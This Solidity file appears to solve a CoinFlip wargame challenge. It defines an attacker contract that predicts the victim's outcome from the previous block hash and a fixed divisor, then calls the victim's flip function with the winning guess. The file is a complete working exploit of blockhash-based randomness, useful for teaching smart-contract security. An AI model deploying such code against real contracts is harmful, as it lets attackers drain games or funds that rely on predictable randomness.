//SPDX-License-Indentifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Coinflip.sol";

contract N3Attacker {
    using SafeMath for uint256;
    CoinFlip victim;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victim) public {
        victim = CoinFlip(_victim);
    }

    function flipForWin() public {
        uint lastBlockHash = uint256(blockhash(block.number.sub(1)));
        lastBlockHash.div(FACTOR) == 1 ? victim.flip(true) : victim.flip(false);
    }
}